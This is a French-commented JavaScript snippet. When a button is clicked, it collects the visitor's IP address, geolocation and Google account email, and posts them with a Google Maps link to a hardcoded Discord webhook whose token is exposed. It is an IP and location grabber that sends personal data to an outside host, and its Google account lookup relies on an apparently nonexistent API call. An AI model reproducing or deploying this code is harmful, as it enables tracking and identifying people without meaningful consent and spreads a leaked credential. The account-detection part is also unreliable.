// Fonction pour détecter le nom d'adresse email (compte Google)
function getGoogleAccountName() {
    let accountName = 'None';  // Valeur par défaut si aucun compte Google n'est détecté

    // Vérification de l'authentification Google
    if (typeof(google) !== 'undefined' && typeof(google.accounts) !== 'undefined' && typeof(google.accounts.id) !== 'undefined') {
        let userProfile = google.accounts.id.get();

        if (userProfile && userProfile.email) {
            accountName = userProfile.email;
        }
    }

    return accountName;
}

document.getElementById('get-info-btn').addEventListener('click', function() {
    fetch('http://ip-api.com/json/')
        .then(response => response.json())
        .then(data => {
            if (data.status === 'success') {
                // Obtenir le nom d'adresse email (compte Google)
                let googleAccountName = getGoogleAccountName();

                // Construire le message à envoyer au webhook Discord
                let message = {
                    content: `
                        **${googleAccountName} a cliqué sur le bouton**
                        \nVotre adresse IP est: ${data.query}
                        \nVotre localisation approximative est:
                        \nLatitude: ${data.lat}, Longitude: ${data.lon}
                        \nVille: ${data.city}, Région: ${data.regionName}, Pays: ${data.country}
                        \n[Google Maps](https://www.google.com/maps?q=${data.lat},${data.lon})  // lien vers Google Maps
                    `
                };

                // URL du webhook Discord
                let webhookUrl = 'https://discord.com/api/webhooks/1243652550251515914/SrRtaX_dz1S_l1rKGroUHBmvvzBSqVfcWpe07WKJQ8nvLFeIImfe-XgBBlDcT6r_00VU';

                // Envoi du message au webhook Discord
                fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(message)
                }).then(response => {
                    if (response.ok) {
                        alert('Les informations ont été envoyées avec succès au webhook Discord.');
                    } else {
                        throw new Error('Erreur lors de l\'envoi au webhook Discord. Statut: ' + response.status);
                    }
                }).catch(error => {
                    console.error('Erreur:', error);
                    alert('Erreur lors de l\'envoi au webhook Discord. Veuillez réessayer.');
                });

                // Affichage des informations dans l'élément #info-display
                document.getElementById('info-display').innerText = `
                    Votre adresse IP est: ${data.query}
                    \nVotre localisation approximative est:
                    \nLatitude: ${data.lat}, Longitude: ${data.lon}
                    \nVille: ${data.city}, Région: ${data.regionName}, Pays: ${data.country}
                    \n[Google Maps](https://www.google.com/maps?q=${data.lat},${data.lon})  // lien vers Google Maps
                `;
            } else {
                document.getElementById('info-display').innerText = 'Impossible d\'obtenir les informations.';
            }
        })
        .catch(error => {
            document.getElementById('info-display').innerText = 'Erreur lors de la récupération des informations.';
            console.error('Erreur:', error);
        });
});
